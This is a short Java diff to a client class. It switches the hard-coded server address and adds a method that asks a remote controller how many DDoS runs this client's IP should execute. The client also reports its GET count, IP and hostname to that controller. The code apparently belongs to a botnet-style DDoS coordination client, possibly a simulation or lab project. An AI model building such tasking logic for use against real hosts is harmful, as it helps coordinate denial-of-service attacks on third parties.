@@ -32,7 +32,7 @@ public class ClientControllerCon {
         boolean isServerCameOnline=false;
            
         CallHandler callHandler = new CallHandler();
-        String remoteHost = "192.168.1.4";
+        String remoteHost = "172.20.8.65";//"192.168.1.4";
         int portWasBinded = 58883;
         
         Client client=null;
@@ -54,13 +54,27 @@ public class ClientControllerCon {
         if(myGETCount!=0 && !myIP.equals("") && !hostName.equals(""))
             remoteObject.setDDOSCount(myGETCount,myIP,hostName);
         
-         
-        
-
-           
-       
         }
         return isServerCameOnline;
+       }
+       
+       
+       
+        public static int takeNumOfDDOSToBeExcecuted(){
+           int ddosNos=0;
+           
+           if(remoteObject.isProposedDDOSCountSet()){
+           ddosNos=remoteObject.getNumofDDOSToBeExcecuted(myIP);
+           
+            System.out.println(" takeNumOfDDOSToBeExcecuted returned = "+ddosNos);
+            
+            
+            if(myGETCount>ddosNos)
+                   System.out.println("Provided ddos count is lower, thus");
+            
+           }
+           
+           return ddosNos;
        }
        
        
